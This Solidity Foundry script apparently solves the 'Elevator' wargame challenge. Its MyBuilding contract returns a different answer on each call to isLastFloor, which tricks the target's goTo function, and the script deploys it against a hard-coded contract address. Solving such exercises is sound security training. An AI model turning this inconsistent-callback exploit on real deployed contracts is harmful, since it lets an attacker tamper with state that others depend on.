// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";

contract MyBuilding {
    Elevator public code = Elevator(0x40E1e250b8EBB221D21ea94f595c5f98B3d5044B);
    bool private ok;

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!ok) {
            ok = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        code.goTo(99999999);
    }
}

contract ElevatorScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        MyBuilding building = new MyBuilding();
        building.attack();
        vm.stopBroadcast();
    }
}
